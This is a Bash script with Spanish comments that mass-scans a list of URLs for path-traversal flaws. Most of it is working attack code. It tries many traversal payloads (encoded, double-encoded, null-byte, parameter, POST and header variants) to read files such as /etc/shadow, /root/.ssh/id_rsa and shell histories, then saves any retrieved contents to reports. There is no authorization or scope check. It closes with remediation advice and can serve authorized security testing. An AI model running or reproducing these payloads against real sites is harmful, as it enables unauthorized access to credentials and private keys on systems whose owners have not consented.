#!/bin/bash
# advanced_path_traversal_tester.sh
# Script completo para detectar y confirmar vulnerabilidades de Path Traversal
# Lee URLs desde archivo url.txt (una por línea)

URL_FILE="${1:-url.txt}"
MASTER_OUTPUT="/tmp/path_traversal_master_report_$$.txt"
TIMEOUT=5

# Verificar que el archivo existe
if [ ! -f "$URL_FILE" ]; then
    echo "Error: Archivo $URL_FILE no encontrado"
    echo "Creando archivo de ejemplo..."
    echo "https://ejemplo1.com" > url.txt
    echo "http://ejemplo2.com" >> url.txt
    echo "http://192.168.1.100" >> url.txt
    echo "Archivo de ejemplo creado. Edita 'url.txt' con tus URLs."
    exit 1
fi

# Contar URLs
URL_COUNT=$(wc -l < "$URL_FILE")
echo "=================================================="
echo "    DETECTOR AVANZADO DE PATH TRAVERSAL"
echo "    Archivo de URLs: $URL_FILE"
echo "    URLs a analizar: $URL_COUNT"
echo "=================================================="
echo ""

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Archivos sensibles a intentar leer
SENSITIVE_FILES="
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/etc/motd
/proc/self/environ
/proc/version
/proc/cpuinfo
/var/log/messages
/var/log/auth.log
/var/log/secure
/etc/httpd/conf/httpd.conf
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/hosts.allow
/etc/hosts.deny
/home/*/.bash_history
/home/*/.ssh/id_rsa
/home/*/.ssh/authorized_keys
/root/.bash_history
/root/.ssh/id_rsa
windows/win.ini
windows/system32/drivers/etc/hosts
../../../windows/system32/drivers/etc/hosts
../../boot.ini
C:/boot.ini
C:/Windows/System32/drivers/etc/hosts
"

# Funciones de utilidad
print_success() {
    echo -e "${GREEN}[+] $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

print_error() {
    echo -e "${RED}[-] $1${NC}"
}

print_info() {
    echo -e "${BLUE}[*] $1${NC}"
}

test_path_traversal() {
    local url="$1"
    local description="$2"
    local output_file="$3"

    echo "" >> "$output_file"
    echo "=== Vector: $description ===" >> "$output_file"
    echo "URL: $url" >> "$output_file"

    # Realizar petición con timeout
    response=$(timeout $TIMEOUT curl -s -k -w "|HTTP_STATUS:%{http_code}|SIZE:%{size_download}" "$url" 2>/dev/null)

    http_status=$(echo "$response" | grep -o "HTTP_STATUS:[0-9]*" | cut -d: -f2)
    response_size=$(echo "$response" | grep -o "SIZE:[0-9]*" | cut -d: -f2)
    content=$(echo "$response" | sed 's/|HTTP_STATUS:.*//')

    echo "HTTP Status: $http_status" >> "$output_file"
    echo "Response Size: $response_size bytes" >> "$output_file"

    # Analizar respuesta
    if [ "$http_status" = "200" ]; then
        if [ -n "$content" ]; then
            # Buscar indicadores de éxito para Linux
            if echo "$content" | grep -i -q "root:\|daemon:\|bin:\|sys:\|nobody:\|Administrator:"; then
                print_success "¡VULNERABLE! Path traversal confirmado"
                echo "CONTENT (first 10 lines):" >> "$output_file"
                echo "$content" | head -20 >> "$output_file"
                echo "---" >> "$output_file"
                return 0
            # Buscar indicadores para Windows
            elif echo "$content" | grep -i -q "\[boot loader\]\|\[fonts\]\|\[extensions\]\|127.0.0.1.*localhost"; then
                print_success "¡VULNERABLE! Path traversal confirmado (Windows)"
                echo "CONTENT (first 10 lines):" >> "$output_file"
                echo "$content" | head -20 >> "$output_file"
                echo "---" >> "$output_file"
                return 0
            elif [ "$response_size" -gt 1000 ] && [ "$response_size" -lt 100000 ]; then
                print_warning "Respuesta larga ($response_size bytes) - Posible éxito"
                echo "Primeras líneas:" >> "$output_file"
                echo "$content" | head -10 >> "$output_file"
                return 1
            fi
        fi
    elif [ "$http_status" = "403" ] || [ "$http_status" = "404" ]; then
        echo "Bloqueado (HTTP $http_status)" >> "$output_file"
    elif [ "$http_status" = "500" ]; then
        print_warning "Error 500 - Posible vector válido pero con error"
        echo "Error 500 detectado" >> "$output_file"
        return 2
    fi

    return 3
}

# Funciones para diferentes tipos de pruebas
test_with_parameter() {
    local base_url="$1"
    local param="$2"
    local file_path="$3"
    local test_name="$4"
    local output_file="$5"

    test_path_traversal "${base_url}?${param}=${file_path}" "$test_name" "$output_file"
}

test_direct_access() {
    local url="$1"
    local test_name="$2"
    local output_file="$3"

    test_path_traversal "$url" "$test_name" "$output_file"
}

# Lista de parámetros comunes
COMMON_PARAMS="
file
filename
path
document
doc
page
template
include
load
read
src
view
content
image
img
url
download
redirect
data
input
output
"

# Variables para resumen global
TOTAL_VULNERABLE=0
VULNERABLE_URLS=""
SAFE_URLS=""

# Procesar cada URL del archivo
URL_NUMBER=0

while IFS= read -r TARGET || [ -n "$TARGET" ]; do
    # Saltar líneas vacías y comentarios
    TARGET=$(echo "$TARGET" | sed 's/#.*//' | xargs)
    [ -z "$TARGET" ] && continue

    URL_NUMBER=$((URL_NUMBER + 1))

    # Crear archivo de salida para esta URL
    URL_OUTPUT="/tmp/path_traversal_$(echo "$TARGET" | sed 's/[^a-zA-Z0-9]/_/g')_$$.txt"

    echo ""
    echo "=================================================="
    echo "    ANALIZANDO URL $URL_NUMBER de $URL_COUNT"
    echo "    Target: $TARGET"
    echo "=================================================="

    # Inicio del análisis para esta URL
    print_info "Iniciando análisis de Path Traversal..."
    echo "Reporte de Path Traversal - $(date)" > "$URL_OUTPUT"
    echo "Target: $TARGET" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"

    # Extraer base path
    BASE_DOMAIN=$(echo "$TARGET" | awk -F/ '{print $1 "//" $3}')
    BASE_PATH=$(echo "$TARGET" | awk -F/ '{for(i=4;i<=NF;i++) printf "/%s", $i}')

    # Variables para esta URL
    basic_success=0
    encoded_success=0
    param_success=0
    null_success=0
    advanced_success=0
    path_success=0
    multiparam_success=0
    post_success=0
    ua_success=0
    header_success=0

    # ============================================================================
    # PRUEBA 1: Vectores básicos de Path Traversal
    # ============================================================================
    print_info "1. Probando vectores básicos de Path Traversal..."

    for file in $SENSITIVE_FILES; do
        for i in 1 2 3 4 5 6; do
            dots=$(printf '../%.0s' $(seq 1 $i))
            test_direct_access "$TARGET${dots}${file}" "Basic: ${dots}${file}" "$URL_OUTPUT"
            if [ $? -eq 0 ]; then
                basic_success=1
            fi
        done
    done

    # ============================================================================
    # PRUEBA 2: Encoding básico
    # ============================================================================
    print_info "2. Probando encoding básico..."

    ENCODED_VECTORS="
    ..%2f..%2f..%2fetc%2fpasswd
    ..%252f..%252f..%252fetc%252fpasswd
    %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
    %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
    ..%5c..%5c..%5cetc%5cpasswd
    "

    for vector in $ENCODED_VECTORS; do
        test_direct_access "$TARGET$vector" "Encoded: $vector" "$URL_OUTPUT"
        if [ $? -eq 0 ]; then
            encoded_success=1
        fi
    done

    # ============================================================================
    # PRUEBA 3: Pruebas con parámetros comunes
    # ============================================================================
    print_info "3. Probando con parámetros comunes..."

    for param in $COMMON_PARAMS; do
        for file in "/etc/passwd" "/etc/hosts" "/windows/win.ini"; do
            for depth in 3 4 5; do
                dots=$(printf '../%.0s' $(seq 1 $depth))
                test_with_parameter "$TARGET" "$param" "${dots}${file}" "Param: $param - ${dots}${file}" "$URL_OUTPUT"
                if [ $? -eq 0 ]; then
                    param_success=1
                fi
            done
        done
    done

    # ============================================================================
    # PRUEBA 4: Null byte injection
    # ============================================================================
    print_info "4. Probando Null Byte Injection..."

    NULL_BYTE_VECTORS="
    ../../../etc/passwd%00
    ../../../../etc/passwd%00.jpg
    ../../../etc/passwd%00.txt
    ../../../../etc/passwd%00.html
    etc/passwd%00
    ../../../windows/win.ini%00
    "

    for vector in $NULL_BYTE_VECTORS; do
        # Probar acceso directo
        test_direct_access "$TARGET$vector" "Null Byte direct: $vector" "$URL_OUTPUT"
        if [ $? -eq 0 ]; then
            null_success=1
        fi

        # Probar con parámetros
        for param in "file" "path" "src"; do
            test_with_parameter "$TARGET" "$param" "$vector" "Null Byte param $param: $vector" "$URL_OUTPUT"
            if [ $? -eq 0 ]; then
                null_success=1
            fi
        done
    done

    # ============================================================================
    # PRUEBA 5: Double encoding y técnicas avanzadas
    # ============================================================================
    print_info "5. Probando Double Encoding y técnicas avanzadas..."

    ADVANCED_VECTORS="
    ..%252f..%252f..%252f..%252f..%252fetc/passwd
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
    ....//....//....//etc//passwd
    ..;/..;/..;/etc/passwd
    ..\\..\\..\\etc\\passwd
    ..%5c..%5c..%5cetc%5cpasswd
    /%2e%2e/%2e%2e/%2e%2e/etc/passwd
    "

    for vector in $ADVANCED_VECTORS; do
        test_direct_access "$TARGET$vector" "Advanced: $vector" "$URL_OUTPUT"
        if [ $? -eq 0 ]; then
            advanced_success=1
        fi
    done

    # ============================================================================
    # PRUEBA 6: Pruebas en rutas específicas comunes
    # ============================================================================
    print_info "6. Probando rutas comunes..."

    COMMON_PATHS="
    /
    /images/
    /images/..%2f..%2f..%2fetc/passwd
    /uploads/
    /uploads/..%2f..%2f..%2fetc/passwd
    /assets/
    /assets/..%2f..%2f..%2fetc/passwd
    /files/
    /files/..%2f..%2f..%2fetc/passwd
    /downloads/
    /downloads/..%2f..%2f..%2fetc/passwd
    /css/
    /css/..%2f..%2f..%2fetc/passwd
    /js/
    /js/..%2f..%2f..%2fetc/passwd
    "

    for path in $COMMON_PATHS; do
        for file in "../../../etc/passwd" "../../../etc/hosts"; do
            test_direct_access "${BASE_DOMAIN}${path}${file}" "Path: ${path}${file}" "$URL_OUTPUT"
            if [ $? -eq 0 ]; then
                path_success=1
            fi
        done
    done

    # ============================================================================
    # PRUEBA 7: Bypass con múltiples parámetros
    # ============================================================================
    print_info "7. Probando bypass con múltiples parámetros..."

    MULTIPARAM_TESTS="
    file=../../../etc/passwd&test=123
    filename=test.txt&file=../../../etc/passwd
    file=test&include=../../../etc/passwd
    path=../../../etc/passwd&.jpg
    normal=test&file=../../../etc/passwd
    id=1&file=../../../etc/passwd
    "

    for test in $MULTIPARAM_TESTS; do
        url="$TARGET?$test"
        echo "" >> "$URL_OUTPUT"
        echo "=== Multi-param: $test ===" >> "$URL_OUTPUT"
        echo "URL: $url" >> "$URL_OUTPUT"

        response=$(timeout $TIMEOUT curl -s -k -w "|HTTP_STATUS:%{http_code}" "$url" 2>/dev/null)
        http_status=$(echo "$response" | grep -o "HTTP_STATUS:[0-9]*" | cut -d: -f2)

        if [ "$http_status" = "200" ]; then
            content=$(echo "$response" | sed 's/|HTTP_STATUS:.*//')
            if echo "$content" | grep -i -q "root:\|\[boot loader\]"; then
                print_success "Multi-param bypass exitoso"
                multiparam_success=1
                echo "CONTENT (first 5 lines):" >> "$URL_OUTPUT"
                echo "$content" | head -5 >> "$URL_OUTPUT"
            fi
        fi
    done

    # ============================================================================
    # PRUEBA 8: Usando HTTP POST
    # ============================================================================
    print_info "8. Probando con método POST..."

    for param in "file" "path" "filename"; do
        post_data="${param}=../../../etc/passwd"
        echo "" >> "$URL_OUTPUT"
        echo "=== POST Test: $param ===" >> "$URL_OUTPUT"
        echo "URL: $TARGET" >> "$URL_OUTPUT"
        echo "Data: $post_data" >> "$URL_OUTPUT"

        response=$(timeout $TIMEOUT curl -s -k -X POST -d "$post_data" -w "|HTTP_STATUS:%{http_code}" "$TARGET" 2>/dev/null)
        http_status=$(echo "$response" | grep -o "HTTP_STATUS:[0-9]*" | cut -d: -f2)

        if [ "$http_status" = "200" ]; then
            content=$(echo "$response" | sed 's/|HTTP_STATUS:.*//')
            if echo "$content" | grep -i -q "root:\|\[boot loader\]"; then
                print_success "POST method vulnerable con parámetro: $param"
                echo "POST vulnerable" >> "$URL_OUTPUT"
                echo "$content" | head -5 >> "$URL_OUTPUT"
                post_success=1
            fi
        fi
    done

    # ============================================================================
    # PRUEBA 9: Usando diferentes User-Agents y Headers
    # ============================================================================
    print_info "9. Probando con diferentes User-Agents..."

    USER_AGENTS="
    Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
    Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
    curl/7.68.0
    python-requests/2.25.1
    Java/1.8.0_281
    Googlebot/2.1
    "

    for ua in $USER_AGENTS; do
        echo "" >> "$URL_OUTPUT"
        echo "=== User-Agent: $ua ===" >> "$URL_OUTPUT"

        response=$(timeout $TIMEOUT curl -s -k -A "$ua" -w "|HTTP_STATUS:%{http_code}" "$TARGET?file=../../../etc/passwd" 2>/dev/null)
        http_status=$(echo "$response" | grep -o "HTTP_STATUS:[0-9]*" | cut -d: -f2)

        echo "HTTP Status: $http_status" >> "$URL_OUTPUT"

        if [ "$http_status" = "200" ]; then
            content=$(echo "$response" | sed 's/|HTTP_STATUS:.*//')
            if echo "$content" | grep -i -q "root:\|\[boot loader\]"; then
                print_success "Vulnerable con User-Agent: $ua"
                ua_success=1
            fi
        fi
    done

    # ============================================================================
    # PRUEBA 10: Pruebas con referer y otros headers
    # ============================================================================
    print_info "10. Probando con headers especiales..."

    # Probar con Referer malicioso
    echo "" >> "$URL_OUTPUT"
    echo "=== Header: Referer ===" >> "$URL_OUTPUT"
    response=$(timeout $TIMEOUT curl -s -k -H "Referer: $TARGET../../../etc/passwd" -w "|HTTP_STATUS:%{http_code}" "$TARGET" 2>/dev/null)
    http_status=$(echo "$response" | grep -o "HTTP_STATUS:[0-9]*" | cut -d: -f2)

    if [ "$http_status" = "200" ]; then
        content=$(echo "$response" | sed 's/|HTTP_STATUS:.*//')
        if echo "$content" | grep -i -q "root:\|\[boot loader\]"; then
            print_success "Vulnerable a través del header Referer"
            header_success=1
        fi
    fi

    # ============================================================================
    # RESUMEN PARA ESTA URL
    # ============================================================================
    echo "" >> "$URL_OUTPUT"
    echo "==================================================" >> "$URL_OUTPUT"
    echo "                RESUMEN DEL ANÁLISIS" >> "$URL_OUTPUT"
    echo "==================================================" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"

    # Contar vulnerabilidades encontradas
    vuln_count=0
    [ $basic_success -eq 1 ] && vuln_count=$((vuln_count + 1))
    [ $encoded_success -eq 1 ] && vuln_count=$((vuln_count + 1))
    [ $param_success -eq 1 ] && vuln_count=$((vuln_count + 1))
    [ $null_success -eq 1 ] && vuln_count=$((vuln_count + 1))
    [ $advanced_success -eq 1 ] && vuln_count=$((vuln_count + 1))
    [ $path_success -eq 1 ] && vuln_count=$((vuln_count + 1))
    [ $multiparam_success -eq 1 ] && vuln_count=$((vuln_count + 1))
    [ $post_success -eq 1 ] && vuln_count=$((vuln_count + 1))
    [ $ua_success -eq 1 ] && vuln_count=$((vuln_count + 1))
    [ $header_success -eq 1 ] && vuln_count=$((vuln_count + 1))

    echo "Total de técnicas exitosas: $vuln_count/10" >> "$URL_OUTPUT"
    echo "" >> "$URL_OUTPUT"

    # Agregar al reporte maestro
    echo "==================================================" >> "$MASTER_OUTPUT"
    echo "URL: $TARGET" >> "$MASTER_OUTPUT"
    echo "Estado: $([ $vuln_count -gt 0 ] && echo "VULNERABLE" || echo "SAFE")" >> "$MASTER_OUTPUT"
    echo "Técnicas exitosas: $vuln_count/10" >> "$MASTER_OUTPUT"
    echo "Reporte detallado: $URL_OUTPUT" >> "$MASTER_OUTPUT"

    if [ $vuln_count -gt 0 ]; then
        print_error "¡VULNERABILIDAD DE PATH TRAVERSAL CONFIRMADA!"
        echo "ESTADO: ${RED}VULNERABLE${NC}" >> "$URL_OUTPUT"
        echo "El servidor es vulnerable a Path Traversal" >> "$URL_OUTPUT"
        TOTAL_VULNERABLE=$((TOTAL_VULNERABLE + 1))
        VULNERABLE_URLS="${VULNERABLE_URLS}\n- $TARGET ($vuln_count técnicas)"

        echo "" >> "$MASTER_OUTPUT"
        echo "Técnicas exitosas:" >> "$MASTER_OUTPUT"
        [ $basic_success -eq 1 ] && echo "- Vectores básicos" >> "$MASTER_OUTPUT"
        [ $encoded_success -eq 1 ] && echo "- Encoding básico" >> "$MASTER_OUTPUT"
        [ $param_success -eq 1 ] && echo "- Diferentes parámetros" >> "$MASTER_OUTPUT"
        [ $null_success -eq 1 ] && echo "- Null byte injection" >> "$MASTER_OUTPUT"
        [ $advanced_success -eq 1 ] && echo "- Técnicas avanzadas" >> "$MASTER_OUTPUT"
        [ $path_success -eq 1 ] && echo "- Rutas comunes" >> "$MASTER_OUTPUT"
        [ $multiparam_success -eq 1 ] && echo "- Múltiples parámetros" >> "$MASTER_OUTPUT"
        [ $post_success -eq 1 ] && echo "- Método POST" >> "$MASTER_OUTPUT"
        [ $ua_success -eq 1 ] && echo "- Diferentes User-Agents" >> "$MASTER_OUTPUT"
        [ $header_success -eq 1 ] && echo "- Headers especiales" >> "$MASTER_OUTPUT"

        echo "" >> "$URL_OUTPUT"
        echo "IMPACTO:" >> "$URL_OUTPUT"
        echo "• Lectura de archivos sensibles del sistema" >> "$URL_OUTPUT"
        echo "• Posible escalada a RCE (Remote Code Execution)" >> "$URL_OUTPUT"
        echo "• Exposición de información crítica" >> "$URL_OUTPUT"
        echo "• Violación de confidencialidad" >> "$URL_OUTPUT"

        echo "" >> "$URL_OUTPUT"
        echo "RECOMENDACIONES INMEDIATAS:" >> "$URL_OUTPUT"
        echo "1. Validar y sanitizar todas las entradas de usuario" >> "$URL_OUTPUT"
        echo "2. Implementar whitelist de caracteres permitidos" >> "$URL_OUTPUT"
        echo "3. Usar rutas canónicas absolutas" >> "$URL_OUTPUT"
        echo "4. Implementar WAF (Web Application Firewall)" >> "$URL_OUTPUT"
        echo "5. Restringir acceso a directorios del sistema" >> "$URL_OUTPUT"
        echo "6. Actualizar todos los componentes del servidor" >> "$URL_OUTPUT"
    else
        print_success "No se encontraron vulnerabilidades de Path Traversal"
        echo "ESTADO: ${GREEN}NO VULNERABLE${NC}" >> "$URL_OUTPUT"
        echo "El servidor parece estar protegido contra Path Traversal" >> "$URL_OUTPUT"
        SAFE_URLS="${SAFE_URLS}\n- $TARGET"
    fi

    echo "" >> "$URL_OUTPUT"
    echo "==================================================" >> "$URL_OUTPUT"
    echo "Análisis completado: $(date)" >> "$URL_OUTPUT"

    # Mostrar resumen de esta URL en pantalla
    echo ""
    echo "Resumen para $TARGET:"
    echo "  Estado: $([ $vuln_count -gt 0 ] && echo -e "${RED}VULNERABLE${NC}" || echo -e "${GREEN}SEGURO${NC}")"
    echo "  Técnicas exitosas: $vuln_count/10"
    echo "  Reporte detallado: $URL_OUTPUT"
    echo ""

done < "$URL_FILE"

# ============================================================================
# RESUMEN GLOBAL
# ============================================================================
echo ""
echo "=================================================="
echo "             RESUMEN GLOBAL DEL ANÁLISIS"
echo "=================================================="
echo "Archivo analizado: $URL_FILE"
echo "Total de URLs: $URL_COUNT"
echo "URLs vulnerables: $TOTAL_VULNERABLE"
echo "URLs seguras: $((URL_COUNT - TOTAL_VULNERABLE))"
echo ""

if [ $TOTAL_VULNERABLE -gt 0 ]; then
    echo -e "${RED}URLs VULNERABLES:${NC}"
    echo -e "$VULNERABLE_URLS"
    echo ""
fi

if [ -n "$SAFE_URLS" ]; then
    echo -e "${GREEN}URLs SEGURAS:${NC}"
    echo -e "$SAFE_URLS"
    echo ""
fi

# Generar reporte maestro final
MASTER_FINAL="/tmp/path_traversal_final_report_$$.txt"
echo "==================================================" > "$MASTER_FINAL"
echo "       REPORTE MAESTRO PATH TRAVERSAL" >> "$MASTER_FINAL"
echo "       Fecha: $(date)" >> "$MASTER_FINAL"
echo "==================================================" >> "$MASTER_FINAL"
echo "" >> "$MASTER_FINAL"
echo "Archivo analizado: $URL_FILE" >> "$MASTER_FINAL"
echo "Total de URLs: $URL_COUNT" >> "$MASTER_FINAL"
echo "URLs vulnerables: $TOTAL_VULNERABLE" >> "$MASTER_FINAL"
echo "URLs seguras: $((URL_COUNT - TOTAL_VULNERABLE))" >> "$MASTER_FINAL"
echo "" >> "$MASTER_FINAL"

if [ $TOTAL_VULNERABLE -gt 0 ]; then
    echo "URLs VULNERABLES:" >> "$MASTER_FINAL"
    echo -e "$VULNERABLE_URLS" | sed 's/\\n/\n/g' >> "$MASTER_FINAL"
    echo "" >> "$MASTER_FINAL"
fi

echo "Reportes individuales generados:" >> "$MASTER_FINAL"
echo "--------------------------------" >> "$MASTER_FINAL"
grep "Reporte detallado:" "$MASTER_OUTPUT" | while read line; do
    echo "$line" >> "$MASTER_FINAL"
done

echo ""
print_info "Reporte maestro guardado en: $MASTER_FINAL"
print_info "Reportes individuales en: /tmp/path_traversal_*_$$.txt"

# Ejemplo de archivo url.txt
echo ""
print_info "Formato del archivo url.txt:"
echo "# Comentarios con #"
echo "https://ejemplo1.com"
echo "http://192.168.1.100"
echo "http://sitio.com/ruta/especifica"

